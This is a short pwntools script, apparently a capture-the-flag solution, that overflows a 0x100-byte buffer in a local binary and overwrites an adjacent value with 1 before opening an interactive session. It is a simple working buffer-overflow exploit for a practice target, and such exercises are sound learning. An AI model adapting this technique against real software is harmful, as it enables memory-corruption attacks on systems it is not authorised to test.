from pwn import *

p = process('./main')

payload = b'A' * 0x100
payload += p64(1)

p.sendlineafter(b'Input: ', payload)

p.interactive()